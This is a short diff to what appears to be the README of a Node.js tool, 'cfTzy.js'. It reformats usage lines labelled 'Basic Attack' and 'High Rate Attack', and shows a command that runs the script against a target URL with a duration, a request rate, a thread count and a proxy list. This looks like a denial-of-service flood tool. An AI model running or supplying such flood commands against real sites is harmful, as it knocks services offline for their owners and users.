@@ -1,8 +1,6 @@
-```bash
+## **Basic Attack (60 seconds, 10 req/sec, 4 threads)**
 
-# Basic Attack (60 seconds, 10 req/sec, 4 threads)
-
-node cfTzy.js https://example.com 60 10 4 proxies.txt
+```node cfTzy.js https://example.com 60 10 4 proxies.txt```
 
 # High Rate Attack (120 seconds, 50 req/sec, 8 threads)
 
